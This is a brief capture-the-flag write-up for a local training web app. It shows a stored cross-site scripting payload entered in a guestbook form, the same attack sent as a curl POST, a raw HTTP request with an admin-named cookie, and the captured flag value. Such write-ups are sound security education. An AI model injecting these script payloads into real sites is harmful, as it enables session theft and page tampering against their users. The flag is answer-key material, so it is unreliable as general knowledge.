# Crossite scripting

## Summary

page: `http://localhost:8080/index.php?page=feedback`
commands: In the guestbook form, enter in the **Name** field:
```
test
```
and in the **Message** field:
```html
<script>alert('XSS')</script>
```
Or via curl:
```bash
curl -X POST "http://localhost:8080/index.php?page=feedback" \
     -d "txtName=test&mtxtMessage=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E&btnSign=Sign+Guestbook" | grep flag
```

## Details

The guestbook page is vulnerable to XSS.

I entered a <script>alert('XSS')</script in the comment box and got the flag

The flag is : 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e

the whole post req is:
POST /index.php?page=feedback HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 91
Origin: http://localhost:8081
Connection: keep-alive
Referer: http://localhost:8081/index.php?page=feedback
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

txtName=%3Cscript%3Eal&mtxtMessage=ert%28%27XSS%27%29%3C%2Fscript%3E&btnSign=Sign+Guestbook

